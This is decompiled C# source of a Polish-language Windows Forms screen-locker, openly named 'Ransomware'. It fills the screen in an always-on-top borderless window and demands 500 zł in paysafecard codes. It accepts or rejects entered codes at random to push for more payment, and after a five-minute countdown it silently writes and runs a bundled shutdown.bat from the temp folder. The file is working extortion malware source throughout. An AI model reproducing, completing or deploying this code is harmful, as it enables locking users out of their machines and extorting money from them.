using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using WindowsFormsApplication3.Properties;

namespace WindowsFormsApplication3;

public class Ransomware : Form
{
	public float ilosc = 0f;

	public float ktoreklikniecie = 0f;

	public float szansa = 0f;

	public int czas = 0;

	public float czasalefloat = 0f;

	public float napis = 0f;

	public string napisstr = "";

	private Random rnd = new Random();

	public int dozaplaty = 500;

	public int czasdoodjecia = 0;

	public float redirectodjecia = 0f;

	public int staryczas = 0;

	public int dousuniecia = 0;

	public int sytuacjazmiana = 0;

	private Timer x = new Timer();

	private IContainer components = null;

	private Button ZATWIERDZ;

	private ProgressBar progressBar1;

	private TextBox textBox3;

	private TextBox textBox4;

	private Label label1;

	public Ransomware()
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Expected O, but got Unknown
		InitializeComponent();
		x.set_Interval(1000);
		x.add_Tick((EventHandler)MetodaX);
		x.Start();
	}

	private void Ransomware_Load(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).set_TopMost(true);
		((Form)this).set_ShowInTaskbar(false);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_00d5: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e2: Unknown result type (might be due to invalid IL or missing references)
		if (((Control)textBox3).get_Text().Length != 16)
		{
			return;
		}
		ktoreklikniecie += 1f;
		if (ktoreklikniecie == 1f)
		{
			Odrzuc();
			return;
		}
		szansa = rnd.Next(1, 6);
		if (szansa == 1f)
		{
			Akcept();
			return;
		}
		if (szansa == 2f || szansa == 3f)
		{
			Odrzuc();
			return;
		}
		if (szansa == 4f || szansa == 5f)
		{
			NieSto();
			return;
		}
		if (szansa == 6f)
		{
			MessageBox.Show("Problem połączenia z serwerem, spróbuj ponownie!");
			return;
		}
		MessageBox.Show("To nie prawidłowy kod psc, jakby co to pisz bez -, czyli jak wpisales/as 0000-0000-0000-0000, to wpisz 0000000000000000");
		((Control)textBox3).set_Text(string.Empty);
	}

	private void progressBar1_Click(object sender, EventArgs e)
	{
	}

	private void label1_Click(object sender, EventArgs e)
	{
	}

	private void textBox3_TextChanged(object sender, EventArgs e)
	{
		ilosc = ((Control)textBox3).get_Text().Length;
	}

	private void Odrzuc()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Odrzucono i skrocono ci czas o 10 sekund - nie badz taki madry nastepnym razem");
		czas += 10;
		progressBar1.Increment(10);
		((Control)textBox3).set_Text(string.Empty);
	}

	private void Akcept()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		dozaplaty -= 100;
		if (dozaplaty <= 0)
		{
			MessageBox.Show("Zaakceptowano! Juz nic nie musisz placic :D");
			Application.Exit();
		}
		else
		{
			MessageBox.Show("Zaakceptowano! Zostalo ci: " + dozaplaty + "zl do zapłaty!");
			((Control)textBox4).set_Text("Do zaplaty jeszcze " + dozaplaty + " zł");
			((Control)textBox3).set_Text(string.Empty);
		}
	}

	private void NieSto()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("To nie 100zl, skrocono czas o 10s.");
		czas += 10;
		progressBar1.Increment(10);
		((Control)textBox3).set_Text(string.Empty);
	}

	private void Zakazane()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("To nie prawidłowy kod. Skracamy czas o 30s!!!!");
		czas += 30;
		progressBar1.Increment(30);
		((Control)textBox3).set_Text(string.Empty);
	}

	private void textBox1_TextChanged_1(object sender, EventArgs e)
	{
		InitializeComponent();
	}

	public void MetodaX(object sender, EventArgs e)
	{
		czas++;
		napis = 300 - czas;
		napisstr = napis.ToString();
		((Control)label1).set_Text(napisstr);
		progressBar1.Increment(1);
		if (czas >= 300)
		{
			string tempPath = Path.GetTempPath();
			File.WriteAllBytes(tempPath + "shutdown.bat", Resources.shutdown);
			ProcessStartInfo processStartInfo = new ProcessStartInfo(tempPath + "shutdown.bat");
			processStartInfo.CreateNoWindow = true;
			processStartInfo.UseShellExecute = false;
			Process.Start(processStartInfo);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_007c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0086: Expected O, but got Unknown
		//IL_0197: Unknown result type (might be due to invalid IL or missing references)
		//IL_01a1: Expected O, but got Unknown
		//IL_01fe: Unknown result type (might be due to invalid IL or missing references)
		//IL_0208: Expected O, but got Unknown
		//IL_0281: Unknown result type (might be due to invalid IL or missing references)
		//IL_028b: Expected O, but got Unknown
		//IL_0389: Unknown result type (might be due to invalid IL or missing references)
		//IL_0393: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Ransomware));
		ZATWIERDZ = new Button();
		progressBar1 = new ProgressBar();
		textBox3 = new TextBox();
		textBox4 = new TextBox();
		label1 = new Label();
		((Control)this).SuspendLayout();
		((Control)ZATWIERDZ).set_BackColor(Color.FromArgb(128, 255, 128));
		((Control)ZATWIERDZ).set_Font(new Font("Microsoft Sans Serif", 24.75f));
		((Control)ZATWIERDZ).set_Location(new Point(1048, 709));
		((Control)ZATWIERDZ).set_Name("ZATWIERDZ");
		((Control)ZATWIERDZ).set_Size(new Size(294, 113));
		((Control)ZATWIERDZ).set_TabIndex(0);
		((Control)ZATWIERDZ).set_Text("ZATWIERDZ");
		((ButtonBase)ZATWIERDZ).set_UseVisualStyleBackColor(false);
		((Control)ZATWIERDZ).add_Click((EventHandler)button1_Click);
		((Control)progressBar1).set_Location(new Point(354, 903));
		progressBar1.set_Maximum(300);
		((Control)progressBar1).set_Name("progressBar1");
		((Control)progressBar1).set_Size(new Size(1210, 27));
		progressBar1.set_Step(100);
		((Control)progressBar1).set_TabIndex(1);
		((Control)progressBar1).add_Click((EventHandler)progressBar1_Click);
		((Control)textBox3).set_Font(new Font("Microsoft Sans Serif", 48.48f));
		((Control)textBox3).set_Location(new Point(367, 611));
		((Control)textBox3).set_Name("textBox3");
		((Control)textBox3).set_Size(new Size(975, 81));
		((Control)textBox3).set_TabIndex(4);
		((Control)textBox4).set_Font(new Font("Microsoft Sans Serif", 32.25f));
		((Control)textBox4).set_Location(new Point(747, 448));
		((Control)textBox4).set_Name("textBox4");
		((Control)textBox4).set_Size(new Size(500, 56));
		((Control)textBox4).set_TabIndex(5);
		((Control)textBox4).set_Text("Do zaplaty jeszcze 500 zł");
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Microsoft Sans Serif", 42.72f));
		((Control)label1).set_Location(new Point(998, 835));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(124, 65));
		((Control)label1).set_TabIndex(6);
		((Control)label1).set_Text("300");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)(object)Resources.ransomware);
		((Form)this).set_ClientSize(new Size(1920, 1080));
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox4);
		((Control)this).get_Controls().Add((Control)(object)textBox3);
		((Control)this).get_Controls().Add((Control)(object)progressBar1);
		((Control)this).get_Controls().Add((Control)(object)ZATWIERDZ);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Ransomware");
		((Control)this).set_RightToLeft((RightToLeft)0);
		((Control)this).set_Text("Ransomware");
		((Form)this).add_Load((EventHandler)Ransomware_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
